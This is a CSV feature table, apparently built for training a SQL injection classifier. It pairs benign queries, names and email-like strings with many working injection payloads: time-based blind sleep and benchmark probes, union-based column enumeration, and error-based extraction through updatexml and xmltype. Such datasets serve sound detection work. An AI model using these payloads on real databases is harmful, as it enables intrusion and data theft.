,Query,no_single_qts,no_double_qts,no_punct,no_single_cmnt,no_mult_cmnt,no_space,no_perc,no_log_opt,no_arith,no_null,no_hexa,no_alpha,no_digit,len_of_chr_char_null,genuine_keywords,log_query_len,box_query_len
15882,michell4@so-tel.jobs,0,0,3,0,0,0,0,0,1,0,0,16,1,0,0,2.995732273553991,3.7638991627446954
3184,"1""  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""qblj"" like ""qblj",0,4,18,0,0,32,0,2,1,0,0,124,12,0,2,5.3230099791384085,8.074309346777458
21885,select * from happen where golden = 'worth'  and  ( tight = 'carefully' or wide = 'sheet' ) ,6,0,12,0,0,18,0,2,1,0,0,60,0,0,1,4.5217885770490405,6.42130769614405
20547,"  select * from tide where pie in  ( 'particles', 'count', 'knife' )  ",6,0,11,0,0,13,0,0,1,0,0,43,0,0,1,4.248495242049359,5.900560584269694
21321,select * from seat fetch first 3 rows only select top 50 percent * from generally,0,0,2,0,0,15,0,0,2,0,0,61,3,0,5,4.394449154672439,6.17606445953937
19840," select substr ( customername, 2, 5 )  as extractstring from customers;",0,0,5,0,0,11,0,0,0,0,0,52,2,0,1,4.262679877041316,5.927077040928176
12791,undus de lerda,0,0,0,0,0,2,0,0,0,0,0,12,0,0,0,2.6390573296152584,3.2241419783899143
12187,supersticin,0,0,0,0,0,0,0,0,0,0,0,11,0,0,0,2.3978952727983707,2.8749024412290907
20034,select sysdate (  ) ;,0,0,3,0,0,4,0,0,0,0,0,13,0,0,1,3.044522437723423,3.839958531231341
24746," select * from arrow order by mud asc, past desc",0,0,2,0,0,10,0,0,1,0,0,36,0,0,2,3.871201010907891,5.215173163969822
24711,"  select roof,glass,tomorrow from he left join orders on plates.familiarid =  life.ate order by enter.composed",0,0,6,0,0,14,0,0,0,0,0,88,0,0,3,4.700480365792417,6.77328459478072
11853,2100,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1.3862943611198906,1.5376610839645055
30720,select count ( * )  as properly,0,0,3,0,0,6,0,0,1,0,0,21,0,0,2,3.4339872044851463,4.467059038127735
30188,select * from father where situation like '%belong%',2,0,5,0,0,7,2,0,1,0,0,40,0,0,1,3.951243718581428,5.357417698153898
1732,"1%'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   '%'  =  '",4,0,27,0,0,29,2,1,0,0,1,52,24,0,0,5.209486152841421,7.8280942089794525
3773,1  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,0,0,11,0,0,18,0,1,1,0,0,28,2,0,2,4.430816798843313,6.245637257588747
1317,1  )   rlike sleep  (  5  )  #,0,0,4,0,0,7,0,0,0,0,0,10,2,0,0,3.4011973816621555,4.412867051146341
25570,select * from manufacturing where let not like 'just%',2,0,4,0,0,8,1,1,1,0,0,42,0,0,1,3.9889840465642745,5.42506920217274
30312,"  select orders.instantrid, employees.captain, employees.though from ordersright join employees on orders.employeeid  =  employees.dotid order by orders.anyid",0,0,9,0,0,15,0,0,0,0,0,131,0,0,3,5.062595033026967,7.515548459825613
28691,select * from  ( select light from dried ) ,0,0,3,0,0,9,0,0,1,0,0,30,0,0,2,3.7612001156935615,5.022400427811018
9156,"1%""  )   union all select null,null,null,null,null,null#",0,1,9,0,0,5,1,0,0,6,0,38,1,6,1,4.02535169073515,5.490616172199279
13373,desparpajo,0,0,0,0,0,0,0,0,0,0,0,10,0,0,0,2.302585092994046,2.7402564225600523
22632,select * from is where perfectly between '1996-07-01' and '1996-07-31',4,0,9,0,0,9,0,1,5,0,0,36,16,0,1,4.248495242049359,5.900560584269694
4410,"1"" and elt  (  2373  =  5817,5817  )   and ""rsdt""  =  ""rsdt",0,4,9,0,0,11,0,2,0,0,0,17,13,0,0,4.07753744390572,5.5852871348767055
18716,tennant4,0,0,0,0,0,0,0,0,0,0,0,7,1,0,0,2.079441541679836,2.432300417938136
20805,"   select diagram, early, curious from chemical where huge  is null",0,0,2,0,0,10,0,0,0,1,0,52,0,1,1,4.204692619390966,5.819025031871101
15058,43427,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,1.6094379124341005,1.8157827456852256
17217,shing-mi,0,0,1,0,0,0,0,0,1,0,0,7,0,0,0,2.079441541679836,2.432300417938136
17563,enseriarse,0,0,0,0,0,0,0,0,0,0,0,10,0,0,0,2.302585092994046,2.7402564225600523
16791,calle velardes s/n 1?e,0,0,2,0,0,3,0,0,1,0,0,16,1,0,0,3.091042453358316,3.9129887722739327
19258,"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 28549 )  order by meta_id asc",0,0,10,0,0,15,0,0,0,0,0,71,5,0,2,4.634728988229636,6.642694885740106
17784,ezella,0,0,0,0,0,0,0,0,0,0,0,6,0,0,0,1.791759469228055,2.0498957009511405
23522,"  select eatid as id, all as hot from earlier",0,0,1,0,0,9,0,0,0,0,0,34,0,0,1,3.80666248977032,5.101693885125393
17663,holgorio,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
13236,yessica,0,0,0,0,0,0,0,0,0,0,0,7,0,0,0,1.9459101490553128,2.25279015210122
16636,sowry,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,1.6094379124341005,1.8157827456852256
5641,select case when 5894  =  4052 then 1 else null end--,0,0,3,1,0,10,0,0,2,1,0,29,9,1,1,3.970291913552122,5.391515666300752
30557,select * from keep where wheel = 'sharp' limit 3,2,0,4,0,0,9,0,0,1,0,0,34,1,0,1,3.871201010907891,5.215173163969822
25003,select nuts ( s ) from else inner join,0,0,2,0,0,8,0,0,0,0,0,28,0,0,2,3.6375861597263857,4.809458789423759
27234,select * from variety where gun = 'appropriate' limit 3,2,0,4,0,0,9,0,0,1,0,0,41,1,0,1,4.007333185232471,5.458096843121287
10812,-2456'   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  'bbkp'  =  'bbkp,4,0,16,0,0,17,0,2,2,0,0,13,16,0,0,4.532599493153256,6.442340659113198
24736,select * from capital  where heard = judge,0,0,2,0,0,7,0,0,1,0,0,32,0,0,1,3.737669618283368,4.981567234930947
24785,select * from upward where each not like 'moving%',2,0,4,0,0,8,1,1,1,0,0,38,0,0,1,3.912023005428146,5.287509109454676
15488,lewes,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,1.6094379124341005,1.8157827456852256
20303,select * from frozen where not crowd = 'forward'  and not nor = 'soil',4,0,7,0,0,13,0,2,1,0,0,49,0,0,1,4.248495242049359,5.900560584269694
28963,select * from earn,0,0,1,0,0,3,0,0,1,0,0,14,0,0,1,2.8903717578961645,3.6015010896570807
24914,select help ( s )  from bat select cap ( s ) ,0,0,4,0,0,12,0,0,0,0,0,28,0,0,2,3.80666248977032,5.101693885125393
25975,select * from place where ought not between 'belt' and 'noon',4,0,5,0,0,10,0,2,1,0,0,46,0,0,1,4.110873864173311,5.646144513813471
24627,select paint,0,0,0,0,0,1,0,0,0,0,0,11,0,0,1,2.4849066497880004,2.999482870035824
29582,select * from taste where until = 'heading' fetch first 3 rows only,2,0,4,0,0,12,0,0,1,0,0,50,1,0,3,4.204692619390966,5.819025031871101
1575,"-1510""  )   as rqrv where 4507  =  4507 union all select 4507,4507,4507,4507,4507--",0,1,10,1,0,11,0,0,3,0,0,25,32,0,1,4.418840607796598,6.222685223035155
19224,"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 11710 )  order by meta_id asc",0,0,10,0,0,15,0,0,0,0,0,71,5,0,2,4.634728988229636,6.642694885740106
14843,trissenaar@tetdevelocidad.uk,0,0,2,0,0,0,0,0,0,0,0,26,0,0,0,3.332204510175204,4.299691526222142
11798,041!da2131434e,0,0,1,0,0,0,0,1,0,0,0,3,10,0,0,2.6390573296152584,3.2241419783899143
24070,select * from numeral fetch first 3 rows only,0,0,1,0,0,8,0,0,1,0,0,35,1,0,3,3.80666248977032,5.101693885125393
2150,"1%""  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  ""%""  =  """,0,4,24,0,0,23,2,2,1,0,0,66,10,0,2,4.969813299576001,7.321582942195207
19894,select 18 mod 4;,0,0,1,0,0,3,0,0,0,0,0,9,3,0,1,2.772588722239781,3.4229084603450888
15096,odelsia,0,0,0,0,0,0,0,0,0,0,0,7,0,0,0,1.9459101490553128,2.25279015210122
11850,huyente,0,0,0,0,0,0,0,0,0,0,0,7,0,0,0,1.9459101490553128,2.25279015210122
10940,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null,null#",0,1,14,0,0,7,1,0,0,9,0,50,1,9,1,4.418840607796598,6.222685223035155
12812,"travesia uruguay, 172,",0,0,2,0,0,2,0,0,0,0,0,15,3,0,0,3.091042453358316,3.9129887722739327
4143,"-1513""  )   as swvd where 2958  =  2958 union all select 2958,2958,2958--",0,1,8,1,0,11,0,0,3,0,0,25,24,0,1,4.290459441148391,5.97916802637938
1175,"1'  )   where 7587  =  7587 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,0,15,1,0,21,0,1,3,0,0,36,21,0,2,4.762173934797756,6.896968201498669
21580,select * from inch,0,0,1,0,0,3,0,0,1,0,0,14,0,0,1,2.8903717578961645,3.6015010896570807
28402,select top 3 * from wind where street = 'except',2,0,4,0,0,9,0,0,1,0,0,34,1,0,2,3.871201010907891,5.215173163969822
25408,select outline from worker union all select start from soap order by dot,0,0,0,0,0,12,0,0,0,0,0,60,0,0,3,4.276666119016055,5.953276820822519
4899,"-5698'   )    )    as egjr where 5586  =  5586 union all select 5586,5586,5586--",1,0,9,1,0,12,0,0,3,0,0,25,24,0,1,4.382026634673881,6.152384767567401
9691,select sleep  (  5  )   and '%'  =  ',3,0,7,0,0,8,1,1,0,0,0,14,1,0,1,3.610917912644224,4.764024421755989
7279,"-5344"" union all select 9482,9482,9482,9482,9482,9482,9482,9482,9482--",0,1,12,1,0,4,0,0,3,0,0,14,40,0,1,4.248495242049359,5.900560584269694
18540,drop-box,0,0,1,0,0,0,0,0,1,0,0,7,0,0,0,2.079441541679836,2.432300417938136
9786,"1  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",0,0,12,0,0,20,0,1,1,0,0,65,8,0,2,4.787491742782046,6.948051004895869
12174,morande,0,0,0,0,0,0,0,0,0,0,0,7,0,0,0,1.9459101490553128,2.25279015210122
17292,g1ne136,0,0,0,0,0,0,0,0,0,0,0,3,4,0,0,1.9459101490553128,2.25279015210122
11962,greg,0,0,0,0,0,0,0,0,0,0,0,4,0,0,0,1.3862943611198906,1.5376610839645055
7270,"1"" and 2006  =  2006",0,1,2,0,0,4,0,1,0,0,0,3,9,0,0,2.995732273553991,3.7638991627446954
23716,select count ( somebodyid ) from broken,0,0,2,0,0,6,0,0,0,0,0,31,0,0,2,3.6635616461296463,4.853884482035236
12756,9043,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1.3862943611198906,1.5376610839645055
2118,1'||  (  select 'xhcr' from dual where 9279  =  9279,3,0,7,0,0,9,0,1,0,0,0,23,9,0,1,3.951243718581428,5.357417698153898
4337,"1""  )   union all select null,null,null,null,null,null,null,null,null#",0,1,11,0,0,5,0,0,0,9,0,50,1,9,1,4.248495242049359,5.900560584269694
15758,56,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,0.6931471805599453,0.7296931454567191
10735,"1%"" and make_set  (  2905  =  5725,5725  )   and ""%""  =  """,0,4,12,0,0,11,2,2,0,0,0,13,13,0,0,4.060443010546419,5.554195840989334
23819,"  select solid as what, floor as [practice]  from title",0,0,3,0,0,9,0,0,0,0,0,41,0,0,1,4.007333185232471,5.458096843121287
21991,"insert into underline  ( herself, dull, social )  values  ( 'book', 'dry', 'entire' )  ",6,0,14,0,0,14,0,0,0,0,0,55,0,0,0,4.465908118654584,6.313121924766899
22870,select * from slight where    not tales = 'arrive',2,0,4,0,0,8,0,1,1,0,0,35,0,0,1,3.912023005428146,5.287509109454676
23439,select expect ( s )  from slight select satisfied from phrase,0,0,2,0,0,10,0,0,0,0,0,48,0,0,2,4.110873864173311,5.646144513813471
28356," select column_name ( s )  from throat,tell",0,0,4,0,0,7,0,0,0,0,0,31,0,0,1,3.7612001156935615,5.022400427811018
362,x' and userid is null; --,1,0,4,1,0,5,0,1,2,1,0,16,0,1,0,3.218875824868201,4.116261188933881
22295,select earn ( s )  from good,0,0,2,0,0,6,0,0,0,0,0,19,0,0,1,3.332204510175204,4.299691526222142
24467,select * from proud where price = 'luck' limit 3,2,0,4,0,0,9,0,0,1,0,0,34,1,0,1,3.871201010907891,5.215173163969822
8153,1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'brhc' like 'brhc,4,0,19,0,0,26,0,2,1,0,0,42,2,0,2,4.897839799950911,7.1729298517346045
8862,"1%'   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  '%'  =  '",4,0,34,0,0,33,2,5,0,0,0,40,16,4,0,5.135798437050262,7.6704624710446145
20585,select * from frame,0,0,1,0,0,3,0,0,1,0,0,15,0,0,1,2.9444389791664403,3.684523708911846
4936,"1%""  )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",0,1,32,1,0,36,1,4,2,1,0,52,27,6,0,5.220355825078324,7.851491318972704
6295,"-4945 or make_set  (  9354  =  9354,7185  )  ",0,0,6,0,0,8,0,1,1,0,0,9,16,0,0,3.80666248977032,5.101693885125393
27286,select distinct straight from community,0,0,0,0,0,4,0,0,0,0,0,35,0,0,1,3.6635616461296463,4.853884482035236
26045,select min ( handsome )  as gray from food,0,0,2,0,0,8,0,0,0,0,0,31,0,0,1,3.737669618283368,4.981567234930947
11638,ramblizo,0,0,0,0,0,0,0,0,0,0,0,8,0,0,0,2.079441541679836,2.432300417938136
5307, (  select 2527 from pg_sleep  (  5   )    ) ,0,0,5,0,0,10,0,0,0,0,0,17,5,0,1,3.80666248977032,5.101693885125393
927,if  (  8284  =  6171  )   select 8284 else drop function mbih--,0,0,5,1,0,11,0,0,2,0,0,28,12,0,1,4.143134726391533,5.7053230539652695
11399,10380,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,1.6094379124341005,1.8157827456852256
6186,"1%""  )   order by 1--",0,1,5,1,0,4,1,0,2,0,0,7,2,0,1,3.044522437723423,3.839958531231341
26800,select * from ill where another = 'surprise',2,0,4,0,0,7,0,0,1,0,0,33,0,0,1,3.784189633918261,5.062431490914847
24090,select avg ( week ) from against select sum ( mouse ) ,0,0,4,0,0,12,0,0,0,0,0,38,0,0,4,3.9889840465642745,5.42506920217274
99,select * from users where id  =  1   or 1  =  1 -- 1,0,0,5,1,0,13,0,1,3,0,0,24,4,0,1,3.951243718581428,5.357417698153898
93," select * from users where id  =  1 or 1#""{ union select null,version  (    )   -- 1",0,1,10,1,0,17,0,1,3,1,0,46,3,1,2,4.430816798843313,6.245637257588747
2679,"1"" or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and ""vnei"" like ""vnei",0,4,10,0,0,14,0,2,0,0,1,30,21,0,0,4.48863636973214,6.357017110069445
15995,8.65e+15,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
1475,"1 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  # fzni",0,0,18,0,0,23,0,1,0,0,1,37,39,0,1,4.969813299576001,7.321582942195207
24285,select * from giving where car not like '[ran]%',2,0,6,0,0,8,1,1,1,0,0,34,0,0,1,3.871201010907891,5.215173163969822
27220,select top 50 percent * from cook,0,0,1,0,0,6,0,0,1,0,0,24,2,0,2,3.49650756146648,4.571113592379885
19918,select tan ( -3 ) ;,0,0,4,0,0,5,0,0,1,0,0,9,1,0,1,2.9444389791664403,3.684523708911846
5070,1'||  (  select 'agng' from dual where 3337  =  3337 rlike sleep  (  5   )    )   ||',4,0,13,0,0,16,0,2,0,0,0,33,10,0,1,4.442651256490317,6.268357393526619
2777,"1""   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  ""czvm"" like ""czvm",0,4,15,0,0,17,0,2,0,0,0,25,13,0,0,4.59511985013459,6.564633716663423
445," select * from users where id  =  1 or "";#"" or 1  =  1 -- 1",0,2,9,1,0,16,0,2,3,0,0,26,4,0,1,4.07753744390572,5.5852871348767055
10365,"-4127%' union all select 9558,9558,9558#",1,0,6,0,0,4,1,0,1,0,0,14,16,0,1,3.688879454113936,4.897348914472564
13760,22390,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,1.6094379124341005,1.8157827456852256
6688,"-5294%""  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  ) ",0,1,42,0,0,56,1,8,1,0,0,66,37,7,2,5.541263545158426,8.559367492058051
2339,-1985   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else,0,0,41,0,0,54,0,8,1,0,0,63,36,7,2,5.541263545158426,8.559367492058051
22942,"  select orders.sayrid, employees.rose, employees.steep from ordersright join employees on orders.employeeid  =  employees.foxid order by orders.climateid",0,0,9,0,0,15,0,0,0,0,0,127,0,0,3,5.0369526024136295,7.461676673594362
7555,"1""   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  ""nrhz"" like ""nrhz",0,4,22,0,0,36,0,2,1,0,0,123,12,0,2,5.429345628954441,8.308691449703643
25423,select * from difficult  where question = torn,0,0,2,0,0,7,0,0,1,0,0,36,0,0,1,3.828641396489095,5.140218969441503
3660,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and ""%""  =  """,0,3,25,0,0,26,1,4,0,0,0,51,10,4,1,4.90527477843843,7.188213210536463
7366,"1',  (  select   (  case when   (  4209  =  5879  )   then 1 else 4209*  (  select 4209 from information_schema.character_sets  )   end   )    )   ",1,0,15,0,0,24,0,0,1,0,0,65,18,1,2,4.990432586778736,7.364460386922754
1493,"1%""   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  ""%""  =  """,0,4,24,0,0,28,2,2,1,0,0,75,8,0,2,5.147494476813453,7.695368610288299
5627,"1""  )   where 9020  =  9020 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",0,1,35,1,0,61,0,1,4,0,0,103,63,0,7,5.762051382780177,9.066151959510057
16429,thiel,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,1.6094379124341005,1.8157827456852256
17796,robieux,0,0,0,0,0,0,0,0,0,0,0,7,0,0,0,1.9459101490553128,2.25279015210122
4179,-8248 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,4,0,15,0,0,22,0,3,1,0,0,52,18,0,1,4.762173934797756,6.896968201498669
19788," select field ( ""q"", ""s"", ""q"", ""l"" ) ; ",0,8,14,0,0,10,0,0,0,0,0,15,0,0,1,3.6635616461296463,4.853884482035236
30434,select * from gold where interest = 'television'  or sang = 'average',4,0,7,0,0,11,0,1,1,0,0,50,0,0,1,4.23410650459726,5.873719016140452
26750,select count ( explain ) from few,0,0,2,0,0,6,0,0,0,0,0,25,0,0,2,3.49650756146648,4.571113592379885
27636,select avg ( poet ) from spin,0,0,2,0,0,6,0,0,0,0,0,21,0,0,2,3.367295829986474,4.357111686472804
27759,select ready ( s )  from tight left join,0,0,2,0,0,8,0,0,0,0,0,29,0,0,2,3.688879454113936,4.897348914472564
2697,"1%""  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  ""%""  =  """,0,4,75,0,0,92,2,15,0,0,0,104,51,13,2,6.042632833682381,9.734378540508194
8493,1'  )   where 8142  =  8142 waitfor delay '0:0:5'--,3,0,9,1,0,8,0,0,2,0,0,17,12,0,0,3.9318256327243257,5.322755734775789
23246,"  select name,driving from political where sang = 'village' union select wide, average from pictured",2,0,5,0,0,14,0,0,0,0,0,80,0,0,2,4.605170185988092,6.584397772472616
9178,"1""  )   as qmtx where 5280  =  5280 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",0,1,17,1,0,34,0,1,3,0,0,119,20,0,2,5.332718793265369,8.095557578651828
5963,"1'  )   where 1225  =  1225 and elt  (  8831  =  7779,7779  )  --",1,0,9,1,0,13,0,1,2,0,0,11,21,0,0,4.174387269895637,5.762920220853171
28360,select test ( s )  from desert select mysterious from sides,0,0,2,0,0,10,0,0,0,0,0,46,0,0,2,4.07753744390572,5.5852871348767055
22885,delete from made,0,0,0,0,0,2,0,0,0,0,0,14,0,0,0,2.772588722239781,3.4229084603450888
28480,select * from can where not brief = 'desk'  and not method = 'its',4,0,7,0,0,13,0,2,1,0,0,45,0,0,1,4.189654742026425,5.791153910047609
17523,8.73e+15,0,0,2,0,0,0,0,0,1,0,0,1,5,0,0,2.079441541679836,2.432300417938136
15575,nonaspe,0,0,0,0,0,0,0,0,0,0,0,7,0,0,0,1.9459101490553128,2.25279015210122
413,admin'  )   or   (  '1'  =  '1'--,5,0,10,1,0,6,0,1,2,0,0,7,2,0,0,3.49650756146648,4.571113592379885
15586,23593437z,0,0,0,0,0,0,0,0,0,0,0,1,8,0,0,2.19722457733622,2.593591245490939
4460,"1' union all select null,null,null,null,null--",1,0,7,1,0,4,0,0,2,5,0,34,1,5,1,3.828641396489095,5.140218969441503
17024,43791,0,0,0,0,0,0,0,0,0,0,0,0,5,0,0,1.6094379124341005,1.8157827456852256
28649,select tank ( s )  from classroom full outer join,0,0,2,0,0,9,0,0,0,0,0,37,0,0,2,3.8918202981106265,5.251655965920898
21927,select count ( due ) from finger,0,0,2,0,0,6,0,0,0,0,0,24,0,0,2,3.4657359027997265,4.519779854678687
25446,select * from system 3,0,0,1,0,0,4,0,0,1,0,0,16,1,0,1,3.091042453358316,3.9129887722739327
16893,philips@davidymamen.sa,0,0,2,0,0,0,0,0,0,0,0,20,0,0,0,3.091042453358316,3.9129887722739327
27287,select count ( distinct rear )  from strike,0,0,2,0,0,7,0,0,0,0,0,33,0,0,2,3.7612001156935615,5.022400427811018
8623,1 where 6500  =  6500,0,0,1,0,0,4,0,0,0,0,0,5,9,0,0,3.044522437723423,3.839958531231341
20617,select * from worse 3,0,0,1,0,0,4,0,0,1,0,0,15,1,0,1,3.044522437723423,3.839958531231341
11603,grimm@madrid2012.nu,0,0,2,0,0,0,0,0,0,0,0,13,4,0,0,2.9444389791664403,3.684523708911846
27497,select * from chicken order by beautiful desc,0,0,1,0,0,7,0,0,1,0,0,37,0,0,2,3.80666248977032,5.101693885125393
3142,"1%' union all select null,null,null,null,null,null,null#",1,0,9,0,0,4,1,0,0,7,0,42,1,7,1,4.02535169073515,5.490616172199279
7785,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  'ckpm'  =  'ckpm",3,0,29,0,0,33,0,3,0,2,0,68,16,5,0,5.19295685089021,7.792586250719604
29469,"   select consonant, noted, spendfrom in where public  is not null",0,0,2,0,0,10,0,1,0,1,0,51,0,1,1,4.189654742026425,5.791153910047609
17820,desi4teresal,0,0,0,0,0,0,0,0,0,0,0,11,1,0,0,2.4849066497880004,2.999482870035824
3023,"1""  )   where 6018  =  6018 and 7533  =  7533--",0,1,6,1,0,9,0,1,2,0,0,8,17,0,0,3.8501476017100575,5.178036175455065
1659,"1""  )   as rovd where 3764  =  3764 and elt  (  4249  =  4249,7259  )  --",0,1,9,1,0,15,0,1,2,0,0,17,21,0,0,4.290459441148391,5.97916802637938
6769,1  )   where 5025  =  5025,0,0,2,0,0,5,0,0,0,0,0,5,9,0,0,3.258096538021482,4.179397132269193
11671,denni,0,0,0,0,0,0,0,0,0,0,0,5,0,0,0,1.6094379124341005,1.8157827456852256
3021,1'   )    )    as vdhw where 8858  =  8858 order by 1#,1,0,5,0,0,11,0,0,0,0,0,18,10,0,1,3.9889840465642745,5.42506920217274
23901,"  select * from above where lips in  ( 'adult', 'decide', 'our' )  ",6,0,11,0,0,13,0,0,1,0,0,40,0,0,1,4.204692619390966,5.819025031871101
4045,1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  'eqfh'  =  'eqfh,4,0,16,0,0,22,0,2,1,0,0,39,2,0,2,4.700480365792417,6.77328459478072
25073,select avg ( spend ) from turn select sum ( widely ) ,0,0,4,0,0,12,0,0,0,0,0,37,0,0,4,3.970291913552122,5.391515666300752
22759,select rush,0,0,0,0,0,1,0,0,0,0,0,10,0,0,1,2.3978952727983707,2.8749024412290907
6127,"1 where 7412  =  7412 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",0,0,16,1,0,25,0,1,3,0,0,77,17,0,2,5.003946305945459,7.39263251475859
26039,select top 50 percent * from aware,0,0,1,0,0,6,0,0,1,0,0,25,2,0,2,3.5263605246161616,4.621137163019105
2266,"1 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  -- gynj",0,0,17,1,0,19,0,1,3,0,0,67,10,0,2,4.8283137373023015,7.030817503794459
28523,select * from previous where climb like '%tube%',2,0,5,0,0,7,2,0,1,0,0,36,0,0,1,3.871201010907891,5.215173163969822
18756,gomecello,0,0,0,0,0,0,0,0,0,0,0,9,0,0,0,2.19722457733622,2.593591245490939
22521,select avg ( easily ) from sat,0,0,2,0,0,6,0,0,0,0,0,22,0,0,2,3.4011973816621555,4.412867051146341
27479,select * from paper fetch first 50 percent rows only,0,0,1,0,0,9,0,0,1,0,0,40,2,0,3,3.951243718581428,5.357417698153898
25336,"insert into pole  ( earn, eat, corner )  values  ( 'harder', 'sun', 'plus' )  ",6,0,14,0,0,14,0,0,0,0,0,46,0,0,0,4.356708826689592,6.104257869167092
20665,select box ( s ) from poor inner join,0,0,2,0,0,8,0,0,0,0,0,27,0,0,2,3.610917912644224,4.764024421755989
